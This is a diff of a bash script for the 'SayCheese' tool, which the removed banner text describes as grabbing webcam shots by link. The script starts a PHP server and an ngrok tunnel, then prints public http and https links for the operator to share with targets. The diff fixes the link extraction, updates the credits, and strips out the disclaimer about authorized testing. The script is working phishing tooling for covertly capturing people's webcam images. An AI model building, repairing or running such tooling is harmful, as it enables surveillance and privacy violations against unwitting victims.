@@ -1,35 +1,21 @@
 #!/bin/bash
 # SayCheese v1.2
-# Coded by: @linux_choice (twitter)
-# Github: https://github.com/thelinuxchoice/saycheese
 
 trap 'printf "\n";stop' 2
 
 banner() {
 
+printf "\n\n\e[1;92m  ____              \e[0m\e[0;31m ____ _                          \e[0m\n"
+printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[0;31m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
+printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[0;31m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
+printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[0;31m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
+printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[0;31m\____|_| |_|\___|\___||___/\___| \e[0m\n"
+printf "\e[1;92m              |___/ \e[0m                                 \n\n"
 
-printf "      \e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
-printf "      \e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
-printf "      \e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
-printf "      \e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
-printf "      \e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
-printf "      \e[1;92m              |___/ \e[0m                                 \n"
-
+printf " \e[1;92m v1.0 coded by github.com/thelinuxchoice \e[0m \n"
+printf " \e[1;34m v1.2 coded by github.com/TechnicalHeadquarter \e[0m \n"
+printf " \e[1;91m v1.2 fixed by github.com/angelluis24 \e[0m\n"
 printf "\n"
-printf "\e[1;77m               .:.:\e[0m\e[1;93m Grab webcam shots by link \e[0m\e[1;77m:.:.\e[0m\n"
-printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.2 coded by @linux_choice              \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
-printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]              v1.2 Moded by Youtube.com/TechnicalHeadquarter             \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
-printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]          github.com/thelinuxchoice/saycheese(Repository Deleted)          \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
-printf "\n"
-printf "        \e[1;91m Disclaimer: this tool is designed for security\n"
-printf "         testing in an authorized simulated cyberattack\n"
-printf "         Attacking targets without prior mutual consent\n"
-printf "         is illegal!\n"
-printf "          Tested on Latest Versions......\n"
-printf "         For Any help search 'Youtube.com/TechnicalHeadquarter'\n"
-
-printf "\n"
-
 
 }
 
@@ -153,16 +139,19 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server(Turn On Hotspot if on termu
 php -S 0.0.0.0:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server(Hotspot must be started) \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(http)://[^/"]+.ngrok.io')
 
-if [[ -z $link ]];then
+link2=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+')
+
+if [[ -z $link ]] || [[ -z $link2 ]];then
 printf "\e[1;91m[!] Ngrok error, debug:\e[0m\e[1;77m ./ngrok http 3333\e[0m\n"
 exit 1
 fi
-printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mhttp\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mhttps\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link2
 
 }
 
@@ -218,15 +207,13 @@ checkfound
 
 else
 printf "\e[91m[!] File not found\n"
-printf " For Any help search 'Youtube.com/TechnicalHeadquarter'\n"
-
 
 exit 1
 fi
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
-printf " For Any help search 'Youtube.com/TechnicalHeadquarter'\n"
+
 sleep 1
 clear
 start
